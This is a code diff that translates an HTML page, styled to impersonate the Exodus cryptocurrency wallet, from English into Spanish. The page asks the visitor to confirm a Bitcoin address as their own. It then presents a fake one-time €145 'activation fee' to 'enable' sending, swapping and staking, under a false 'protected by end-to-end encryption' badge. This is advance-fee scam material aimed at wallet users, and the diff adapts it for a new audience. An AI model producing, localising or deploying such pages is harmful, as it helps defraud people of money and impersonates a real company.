@@ -1,120 +1,217 @@
 <!DOCTYPE html>
-<html lang="en">
+
+<html lang="es">
+
 <head>
+
 <meta charset="UTF-8" />
+
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Exodus Wallet — Confirm Transaction</title>
+
+<title>Exodus Wallet — Confirmar Transacción</title>
+
 <style>
+
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
+
   body { background: #0f1119; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+
   .app { width: 100%; max-width: 440px; background: linear-gradient(180deg, #1a1d2e 0%, #131524 100%); border-radius: 24px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); }
+
   .header { padding: 24px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); }
+
   .logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 18px; }
+
   .logo-icon { width: 32px; height: 32px; background: linear-gradient(135deg, #6c5ce7, #a29bfe); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+
   .status { font-size: 12px; color: #6ee7b7; display: flex; align-items: center; gap: 6px; }
+
   .status::before { content: ''; width: 8px; height: 8px; border-radius: 50%; background: #6ee7b7; box-shadow: 0 0 8px #6ee7b7; }
+
   .page { padding: 32px 24px; }
+
   .hidden { display: none; }
+
   h1 { font-size: 22px; margin-bottom: 8px; }
+
   .subtitle { color: #8b8fa3; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
+
   .address-box { background: #0a0c14; border: 1px solid rgba(108,92,231,0.3); border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+
   .label { font-size: 11px; text-transform: uppercase; color: #6c5ce7; letter-spacing: 1px; margin-bottom: 8px; font-weight: 600; }
+
   .address { font-family: 'SF Mono', Menlo, monospace; font-size: 13px; word-break: break-all; line-height: 1.6; color: #e8e9f0; }
+
   .info-card { background: rgba(108,92,231,0.08); border-left: 3px solid #6c5ce7; padding: 14px 16px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; color: #c5c8d6; line-height: 1.6; }
+
   .info-card strong { color: #fff; }
+
   .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-top: 8px; }
+
   .btn-primary { background: linear-gradient(135deg, #6c5ce7, #5340d1); color: white; }
+
   .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 20px rgba(108,92,231,0.4); }
+
   .btn-secondary { background: transparent; color: #8b8fa3; border: 1px solid rgba(255,255,255,0.1); }
+
   .btn-secondary:hover { background: rgba(255,255,255,0.03); }
+
   .tx-row { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 14px; }
+
   .tx-row:last-of-type { border-bottom: none; }
+
   .tx-label { color: #8b8fa3; }
+
   .tx-value { color: #fff; font-weight: 500; text-align: right; }
+
   .tx-value.mono { font-family: 'SF Mono', Menlo, monospace; font-size: 12px; max-width: 200px; word-break: break-all; }
+
   .amount-display { text-align: center; padding: 24px 0; }
+
   .amount-display .eur { font-size: 36px; font-weight: 700; }
+
   .amount-display .btc { color: #8b8fa3; font-size: 14px; margin-top: 4px; }
+
   .activation-note { background: linear-gradient(135deg, rgba(255,193,7,0.1), rgba(255,152,0,0.05)); border: 1px solid rgba(255,193,7,0.3); padding: 16px; border-radius: 12px; margin-bottom: 20px; font-size: 13px; line-height: 1.6; color: #ffd966; }
+
   .activation-note strong { color: #ffc107; display: block; margin-bottom: 4px; font-size: 14px; }
+
   .secure-badge { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 16px; font-size: 12px; color: #6ee7b7; }
+
 </style>
+
 </head>
+
 <body>
+
 <div class="app">
+
   <div class="header">
+
     <div class="logo"><div class="logo-icon">◆</div>Exodus</div>
-    <div class="status">Secure</div>
+
+    <div class="status">Seguro</div>
+
   </div>
 
-  <!-- PAGE 1: CONFIRM ADDRESS -->
+  <!-- PÁGINA 1: CONFIRMAR DIRECCIÓN -->
+
   <div class="page" id="page1">
-    <h1>Confirm Your Wallet</h1>
-    <p class="subtitle">Please verify that the Bitcoin address below belongs to your personal Exodus wallet before proceeding.</p>
+
+    <h1>Confirma tu Monedero</h1>
+
+    <p class="subtitle">Por favor verifica que la dirección de Bitcoin que aparece a continuación pertenece a tu monedero personal de Exodus antes de continuar.</p>
 
     <div class="address-box">
-      <div class="label">Your BTC Address</div>
+
+      <div class="label">Tu Dirección BTC</div>
+
       <div class="address">bc1q03t8h5ssqc8c5wnsh4p7qa2u4jyvtm6n40fuv4</div>
+
     </div>
 
     <div class="info-card">
-      <strong>Why we ask:</strong> Confirming ownership protects you from accidental transfers and ensures activation funds reach the correct wallet.
+
+      <strong>Por qué preguntamos:</strong> Confirmar la propiedad te protege de transferencias accidentales y garantiza que los fondos de activación lleguen al monedero correcto.
+
     </div>
 
-    <button class="btn btn-primary" onclick="goToPage(2)">Yes, this is my wallet</button>
-    <button class="btn btn-secondary" onclick="alert('Please contact Exodus support if this address is not yours.')">No, this isn't mine</button>
+    <button class="btn btn-primary" onclick="goToPage(2)">Sí, este es mi monedero</button>
+
+    <button class="btn btn-secondary" onclick="alert('Por favor contacta al soporte de Exodus si esta dirección no es tuya.')">No, este no es el mío</button>
+
   </div>
 
-  <!-- PAGE 2: TRANSACTION -->
+  <!-- PÁGINA 2: TRANSACCIÓN -->
+
   <div class="page hidden" id="page2">
-    <h1>Activation Payment</h1>
-    <p class="subtitle">Review the transaction details below to activate your Exodus wallet.</p>
+
+    <h1>Pago de Activación</h1>
+
+    <p class="subtitle">Revisa los detalles de la transacción a continuación para activar tu monedero Exodus.</p>
 
     <div class="activation-note">
-      <strong>⚡ Exodus Activation Code</strong>
-      A one-time activation fee of <strong>€145</strong> is required to enable full wallet functionality, including sending, swapping, and staking features.
+
+      <strong>⚡ Código de Activación Exodus</strong>
+
+      Se requiere una tarifa de activación única de <strong>€145</strong> para habilitar la funcionalidad completa del monedero, incluyendo enviar, intercambiar y staking.
+
     </div>
 
     <div class="amount-display">
-      <div class="eur">€145.00</div>
-      <div class="btc">≈ 0.00148 BTC</div>
+
+      <div class="eur">€145,00</div>
+
+      <div class="btc">≈ 0,00148 BTC</div>
+
     </div>
 
     <div>
+
       <div class="tx-row">
-        <span class="tx-label">From</span>
+
+        <span class="tx-label">Desde</span>
+
         <span class="tx-value mono">bc1q03t8h5ssqc8c5wnsh4p7qa2u4jyvtm6n40fuv4</span>
+
       </div>
+
       <div class="tx-row">
-        <span class="tx-label">To</span>
-        <span class="tx-value">Exodus Activation</span>
+
+        <span class="tx-label">Hacia</span>
+
+        <span class="tx-value">Activación Exodus</span>
+
       </div>
+
       <div class="tx-row">
-        <span class="tx-label">Network</span>
+
+        <span class="tx-label">Red</span>
+
         <span class="tx-value">Bitcoin (BTC)</span>
+
       </div>
+
       <div class="tx-row">
-        <span class="tx-label">Network Fee</span>
-        <span class="tx-value">€1.20</span>
+
+        <span class="tx-label">Tarifa de Red</span>
+
+        <span class="tx-value">€1,20</span>
+
       </div>
+
       <div class="tx-row">
+
         <span class="tx-label">Total</span>
-        <span class="tx-value">€146.20</span>
+
+        <span class="tx-value">€146,20</span>
+
       </div>
+
     </div>
 
-    <button class="btn btn-primary" onclick="alert('Processing transaction...')">Confirm & Pay €145</button>
-    <button class="btn btn-secondary" onclick="goToPage(1)">Back</button>
+    <button class="btn btn-primary" onclick="alert('Procesando transacción...')">Confirmar y Pagar €145</button>
 
-    <div class="secure-badge">🔒 Protected by Exodus end-to-end encryption</div>
+    <button class="btn btn-secondary" onclick="goToPage(1)">Volver</button>
+
+    <div class="secure-badge">🔒 Protegido por encriptación de extremo a extremo de Exodus</div>
+
   </div>
+
 </div>
 
 <script>
+
   function goToPage(n) {
+
     document.getElementById('page1').classList.toggle('hidden', n !== 1);
+
     document.getElementById('page2').classList.toggle('hidden', n !== 2);
+
   }
+
 </script>
+
 </body>
+
 </html>
